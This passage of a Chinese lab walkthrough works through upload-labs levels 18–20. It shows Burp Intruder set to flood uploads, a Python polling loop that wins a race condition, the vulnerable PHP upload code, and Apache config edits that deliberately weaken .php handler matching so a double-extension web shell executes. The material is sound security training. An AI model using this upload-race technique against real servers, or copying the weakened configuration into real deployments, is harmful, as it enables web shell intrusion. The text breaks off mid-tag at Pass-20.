src="https://bu.dusays.com/2022/05/20/62877378b7d66.webp" alt="" style="zoom:75%"></li><li><p>之后该页面就会多一个条目 <kbd>Payload Option [Null payloads]</kbd>，这里选择 <kbd>Continue indefinitely</kbd>，即无限重放，只要我们不喊停，他就会一直发包。</p><img src="https://bu.dusays.com/2022/05/20/6287737a0a826.webp" alt="" style="zoom:75%"></li><li><p>当然，默认状态下并发请求数为 10，若觉得不够，可以在 <kbd>Resource Pool</kbd> 页面下创建新的 <kbd>resource pool</kbd> 并指定并发请求数。</p><img src="https://bu.dusays.com/2022/05/20/6287737b7aba7.webp" alt="" style="zoom:75%"></li><li><p>最后点击右上角橙色按钮 <kbd>Start attack</kbd> 即开始运作，如果是本地部署的话，可以看到本地 <kbd>upload</kbd> 文件夹下不停闪烁着上传的木马文件。只需在他存在的期间访问他，即可完成木马的植入。</p><img src="https://bu.dusays.com/2022/05/20/628773705a2f8.webp" alt="" style="zoom:75%"></li><li><p>如果只是继续用浏览器不断刷新访问，既不够高效，也不够优雅，甚至访问极其容易出错，完全对不起 <kbd>Burp Suite</kbd> 的效率。因此建议使用脚本，如下 Python 代码即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;[靶机地址]/upload/[文件名]&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Nice!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>其中 <kbd>requests.get(url)</kbd> 即对链接的访问，而 <kbd>html.status_code</kbd> 代表访问返回的状态码，200 即成功处理。</p></li><li><kbd>Intruder</kbd> 在发包的同时运行上述 Python 代码，当屏幕输出一句响亮的 <kbd>Nice!</kbd>，说明木马已成功植入。 <img src="https://bu.dusays.com/2022/05/20/6287737455ccb.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-17">夺旗</h3><ul><li><p>蚁剑连接，当然要连接的应该是我们通过木马文件间接植入的文件。</p><img src="https://bu.dusays.com/2022/05/20/628773727bbe1.webp" alt="" style="zoom:75%"></li><li><p>依旧本地无旗，继续看个视频。</p><div style="position:relative;width:100%;height:0;padding-bottom:75%"><iframe src="//player.bilibili.com/player.html?aid=811356764&bvid=BV1U34y187Df&cid=712642962&page=1&danmaku=0" scrolling="yes" border="0" frameborder="no" framespacing="0" allowfullscreen sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe></div></li></ul><h2 id="Pass-19">Pass-19</h2><h3 id="启动靶机-29">启动靶机</h3><ul><li><p>最后三关，加油！</p><img src="https://bu.dusays.com/2022/05/22/628a5600553cb.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究页面-13">研究页面</h3><ul><li><p>查看提示</p><img src="https://bu.dusays.com/2022/05/22/628a55ffd4c99.webp" alt="" style="zoom:75%"><p>依然是代码审计，所以看源码！</p></li><li><p>源代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =time();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> MyUpload(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;setDir( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>代码分为两部分，隶属于 <kbd>index.php</kbd> 的执行代码与隶属于 <kbd>myupload.php</kbd> 的 <kbd>MyUpload</kbd> 类，对上传文件所执行的操作基本集中在该类中。当然这里只提供了该类的一个预览，让我们知道大致有哪些功能，具体的实现都在靶机后台。</p></li><li><p>首先是白名单部分，本关的白名单数量较多，不再仅限于图片三巨头。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(<span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>, <span class="string">&quot;.ppt&quot;</span>, <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br></pre></td></tr></table></figure></li><li><p>接下来是程序唯一可调用的 <kbd>MyUpload</kbd> 类中的函数 <kbd>upload</kbd>，依据代码可判断，只要维持变量 <kbd>&#36;ret</kbd> 等于 <strong>1</strong> 即可。而要满足这一条件，文件则必须正确通过以下函数，函数内容可由函数名推测。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">isUploadedFile()    <span class="comment">// 检查文件能否上传到服务器临时目录</span></span><br><span class="line">setDir( <span class="variable">$dir</span> )      <span class="comment">// 检查目录是否可以写入</span></span><br><span class="line">checkExtension()    <span class="comment">// 将文件后缀名与白名单比对</span></span><br><span class="line">checkSize()         <span class="comment">// 检查文件是否过大</span></span><br><span class="line">checkFileExists()   <span class="comment">// 检查文件是否已存在（同名）</span></span><br><span class="line">move()              <span class="comment">// 移动至指定目录</span></span><br><span class="line">renameFile()        <span class="comment">// 重命名</span></span><br></pre></td></tr></table></figure><p>可以看出，这次上传文件需要先检查后缀名 <kbd>checkExtension()</kbd> 然后才会在目录中传好文件 <kbd>move()</kbd>，因此，本次的文件后缀名必须在白名单内。如果通过文件包含的话，依然可以简单构造图片马就能成功，不过，本关依然值得更优雅的方法。</p></li><li><p>这里可以利用 Apache 的解析漏洞，由于 Apache 解析文件从右向左解析，如果后缀名无法识别，就会忽略并继续继续向左解析。例如，文件名为 <kbd>h-t-m.php.h-t-m</kbd> 的文件，由于 <kbd>.h-t-m</kbd> 后缀无法识别，因此文件会被解析为 <kbd>h-t-m.php</kbd>。而 Apache 可识别哪些文件后缀名，可以在 Apache 的 <kbd>conf</kbd> 目录下的 <kbd>mime.typs</kbd> 中找到。</p></li><li><p>但是，并不是将符合条件的文件上传即可，因为从源代码中可以看出，程序会对文件进行重命名，而重命名则会导致漏洞失效，因此依然需要使用条件竞争，在重命名之前执行文件！</p></li></ul><h3 id="突破限制-20">突破限制</h3><ul><li><p>查找 <kbd>mime.typs</kbd> 文件，与白名单中一一做比较，然而事情并没有这么顺利，因为在我本地的文件中，白名单的所有后缀名均能识别。那没办法，只能手动更改了，在白名单中挑选一个<psw>软柿子</psw>，将他注释掉，这样就没办法识别他了。就你了，<kbd>.ppt</kbd>，在该句前加一个 <kbd>#</kbd> 即可。</p><img src="https://bu.dusays.com/2022/05/22/628a5601f30d6.webp" alt="" style="zoom:75%"><blockquote><p>后文将看到，还是 <kbd>.7z</kbd> 更好用，虽然文件中有他的配置，实测表示并不影响，即不取消注释也可以。</p></blockquote></li><li><p>构造一个木马 <kbd>.ppt</kbd> 文件，在原木马文件后直接添加后缀 <kbd>.ppt</kbd> 即可，注意务必保留 <kbd>.php</kbd>，否则无法利用漏洞。</p><img src="https://bu.dusays.com/2022/05/22/628a56034f1d5.webp" alt="" style="zoom:75%"></li><li><p>在 <kbd>Burp Suite</kbd> 中打开靶机，上传文件，抓包后发送至 <kbd>Intruder</kbd>，具体步骤与 Pass-18 中相同，这里稍加概括，<kbd>Clear &#36;</kbd> 后设置 <kbd>Payloads</kbd> 为 <kbd>Null payloads</kbd>，并选择 <kbd>Continue indefinitely</kbd> 以无限重发，最后在 <kbd>Resource Pool</kbd> 中设置适当的最大并发请求数 <kbd>Maximum concurrent requests</kbd> 即可 <kbd>Start attack</kbd> .</p><img src="https://bu.dusays.com/2022/05/22/628a5604d070d.webp" alt="" style="zoom:75%"></li><li><p>依旧利用 Pass-18 中使用的 Python 程序访问文件。修改路径指向上传文件即可，值得注意的是，本关的上传路径应该存在 Bug 目前作者未修改。上传一张合法图片，打开图片查看路径即可发现文件被保存在了靶机根目录，且原 <kbd>upload</kbd> 目录名被加在了文件重命名的数字序列前面，由此可判断应该是构造上传路径时少了一个 <kbd>/</kbd>，这里不作修正，了解即可。</p><img src="https://bu.dusays.com/2022/05/22/628a5606928ed.webp" alt="" style="zoom:75%"><p>因此访问所上传的文件的 URL 应为 <code>[靶机地址]/upload[文件名]</code>。</p></li><li><p>两边一同运行，力图植入木马，但是这次就不这么顺利了，Python 程序一直在运行中：</p><img src="https://bu.dusays.com/2022/05/22/628a5608177c1.webp" alt="" style="zoom:75%"></li><li><p>修改代码，加入下面语句，即输出访问返回的状态码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(html.status_code)</span><br></pre></td></tr></table></figure><p>在输出窗口可以看到，访问文件一直返回的是 <kbd>500</kbd>，即服务器错误。但是在 <kbd>Burp Suite</kbd> 不断发包的过程中，是可以看到上传文件在闪动的，也就是说，文件存在，但是无法访问。</p><img src="https://bu.dusays.com/2022/05/22/628a56098a392.webp" alt="" style="zoom:75%"></li></ul><h3 id="问题探究-3">问题探究</h3><ul><li><p>我们在靶机目录中放入木马文件与修改后的伪 <kbd>.ppt</kbd> 文件，在浏览器中访问他们。</p><img src="https://bu.dusays.com/2022/05/22/628a560e1d02e.webp" alt="" style="zoom:75%"><p>木马文件正常访问，但是 <kbd>.ppt</kbd> 文件始终会报 500 服务器错误，因此，该文件并没有被解析为 PHP 文件，也就是漏洞不成立：</p><img src="https://bu.dusays.com/2022/05/22/628a560c59dd7.webp" alt="" style="zoom:75%"> <img src="https://bu.dusays.com/2022/05/22/628a561081387.webp" alt="" style="zoom:75%"></li><li><p>我在 <a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15127661/4081404">这篇文章</a> 中寻找到了答案，也就是说，靶机环境应使用 <kbd>module</kbd> 方式连接 PHP 与 Apache。关于不同方式的介绍，可以参考 <a target="_blank" rel="noopener" href="https://www.lirongyaoper.com/phpxiangguan/41.html">这篇文章</a>。说到这里，就应该注意到，其实作者在环境配置要求中就有提到这个：</p><img src="https://bu.dusays.com/2022/05/22/628a56161f0dc.webp" alt="" style="zoom:75%"></li><li><p>那么具体应该如何配置呢，在 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/install.windows.apache2.php">官方文档</a> 中其实就有，不过并不叫 <kbd>module</kbd> 方式，而是 <kbd>Apache handler</kbd> 方式：</p><img src="https://bu.dusays.com/2022/05/22/628a5619bab37.webp" alt="" style="zoom:75%"><p>参考文档中完成配置，其中两个路径都要修改为本地的路径，由于我自行下载配置的 PHP5 版本不包含 <kbd>php5apache2_4.dll</kbd> 文件，因此配置使用的是 <kbd>php5apache2_2.dll</kbd>，仅供参考：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LoadModule php5_module &quot;D:/phpstudy_pro/Extensions/php/php-5.2.10-Win32/php5apache2_2.dll&quot;</span><br><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">PHPIniDir &quot;D:/phpstudy_pro/Extensions/php/php-5.2.10-Win32&quot;</span><br></pre></td></tr></table></figure></li><li><p>重启 Apache 即可更新配置，但是……</p><img src="https://bu.dusays.com/2022/05/22/628a56123ea68.webp" alt="" style="zoom:75%"><p>很遗憾，报错了，那段十六进制字符串翻译成中文的意思是，不是有效的 win32 程序，也就是说，这个 <kbd>php5apache2_2.dll</kbd> 并不能供我们使用。只是说不是有效的 win32 程序的话，就应该是 Apache 和 PHP 版本并不匹配的问题吧，虽说理论上高版本应该兼容低版本才对。</p></li><li><p>本地靶机使用的 Apache 版本为 <kbd>2.4.39</kbd>，不算旧，那就更新 PHP 的版本，当然这基于高版本 Apache 依然存在该漏洞的前提下。Windows 的各版本的包可以在 <a target="_blank" rel="noopener" href="https://windows.php.net/downloads/releases/archives/">官方存档</a> 中找到，这里有从 PHP <kbd>5.2.10</kbd> 以后几乎全部的包，由于我的本地其他组件均使用 64 位版本的，因此这次 PHP 有必要使用 64 位版本，这里选择 <kbd>5.5.20</kbd> 版本，其中 <code>520</code> 致我的爱情！包中应含有 <kbd>php5apache2_4.dll</kbd> 文件，其中 <kbd>2_4</kbd> 对应于 Apache 的版本，实测 <kbd>nts</kbd> 版本（即非线程安全）的包中是不含该文件的。</p><img src="https://bu.dusays.com/2022/05/22/628a56142641f.webp" alt="" style="zoom:75%"></li><li><p>下载好后解压到相应文件夹中 <kbd>PhpStudy</kbd> 就会自动检测到，可参考 Pass-16 完成初始的扩展路径配置。值得注意的是，在这个版本中针对 Windows 的扩展路径是提供快捷配置的，只需将对应注释去点即可（其实就是使用相对路径）：</p><img src="https://bu.dusays.com/2022/05/22/628a561ba8698.webp" alt="" style="zoom:75%"></li><li><p>然后我们再次修改 Apache 的配置文件 <kbd>httpd.conf</kbd> 将路径指向新配置的 PHP 中，这里路径仅供参考：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LoadModule php5_module &quot;D:/phpstudy_pro/Extensions/php/php-5.5.20-Win32-VC11-x64/php5apache2_4.dll&quot;</span><br><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">PHPIniDir &quot;D:/phpstudy_pro/Extensions/php/php-5.5.20-Win32-VC11-x64&quot;</span><br></pre></td></tr></table></figure><p>启动 Apache，成功，也就是说已经完成了将 PHP 与 Apache 以 <kbd>module</kbd> 方式连接。</p></li><li><p>但是，再次访问测试用的文件时，依然是 500 服务器错误😅</p><img src="https://bu.dusays.com/2022/05/22/628a5617ce07b.webp" alt="" style="zoom:75%"><p>将文件重命名为 <kbd>h-t-m-2.h-t-m</kbd>再测试一遍，浏览器将会显示出木马内容，而再重命名为 <kbd>h-t-m-2.php.h-t-m</kbd> 则依然显示 500 服务器错误。也就是说，对于后缀 <kbd>.h-t-m</kbd> 的文件会因为无法识别而被解析为普通文本，而添加 <kbd>.php.</kbd> 之后则会因为解析漏洞而检测到 <kbd>.php</kbd> 后缀，而经过测试，<kbd>.php</kbd> 文件是可以正常执行的，因此本次是添加未知后缀并引起向前解析后缀导致了 500 服务器错误。此外，这里不使用 <kbd>.ppt</kbd> 文件作测试是因为 Windows 系统对该文件过于敏感，频繁报毒，因此非常后悔选择这个后缀，建议优先选择 <kbd>.7z</kbd>，后文也将更换为该格式进行实操。</p></li><li><p>因此我们可以查看关于 <kbd>.php</kbd> 文件的执行方式，关于这一点，其实在配置 <kbd>module</kbd> 方式时就有过相关配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>就是上面这段，表示匹配到 <kbd>.php</kbd> 后缀时使用 <kbd>x-httpd-php</kbd> 运行该文件，即执行 PHP 脚本。但是，值得注意的是，最后的字符 <kbd>&#36;</kbd> 表示的是尾部匹配，即 <kbd>.php</kbd> 后不应有任何字符，这也就是为什么正常的 <kbd>.php</kbd> 文件可以正常解析而 <kbd>.php.h-t-m</kbd> 文件则无法解析。事实证明 Apache 默认配置也是这种匹配方式，而解决这个问题的方法就是将 <kbd>&#36;</kbd> 删去即可，这样才能与本关的漏洞匹配！</p></li><li><p>继续在浏览器中打开伪装木马文件，没有任何反应，同时文件所在木马生成了通过该文件生成的木马文件！成功了！</p><img src="https://bu.dusays.com/2022/05/22/628a561e5f2d3.webp" alt="" style="zoom:75%"></li></ul><h3 id="再次突破-2">再次突破</h3><ul><li><p>删除用于测试的文件后，再次尝试入侵，在 <kbd>Burp Suite</kbd> 中再次重发包同时 Python 程序运行，再一次，Nice!</p><img src="https://bu.dusays.com/2022/05/22/628a561d2b0d0.webp" alt="" style="zoom:75%"></li><li><p>不过实测有很大概率在 Python 完成 Nice! 之后并没有木马成功植入，而在浏览器中则会返回如下错误：</p><img src="https://bu.dusays.com/2022/05/22/628a56218e85e.webp" alt="" style="zoom:75%"><p>文件流打开错误，文件突然找不到了，虽然返回的依然是 <strong>200</strong> 成功。其实可以理解为锁定文件后还没执行代码文件就已经被删除了，可能是来不及？具体原因暂时无法解答，但一种可行的解决方案是在重发包期间多访问几次，将 Python 代码中的 <kbd>break</kbd> 去掉然后手动适时关闭程序即可，或者手动修改代码定义循环次数。</p></li><li><p>最后在根目录就会出现间接植入的木马文件：</p><img src="https://bu.dusays.com/2022/05/22/628a561fc208b.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-18">夺旗</h3><ul><li><p>蚁剑连接，连接到最终植入的木马文件：</p><img src="https://bu.dusays.com/2022/05/22/628a56235818f.webp" alt="" style="zoom:75%"></li><li><p>依旧本地无旗，继续看个视频。</p><div style="position:relative;width:100%;height:0;padding-bottom:75%"><iframe src="//player.bilibili.com/player.html?aid=679070797&bvid=BV1vm4y1d7Pd&cid=509970027&page=1&danmaku=0" scrolling="yes" border="0" frameborder="no" framespacing="0" allowfullscreen sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe></div></li></ul><h2 id="Pass-20">Pass-20</h2><h3 id="启动靶机-30">启动靶机</h3><ul><li><p>最后两关！</p><img src="https://bu.dusays.com/2022/05/23/628b362bac76b.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究页面-14">研究页面</h3><ul><li><p>最后两关都添加了保存名称的功能，即我们可以自定义文件上传后的名称。查看源码：</p><figure class="highlight 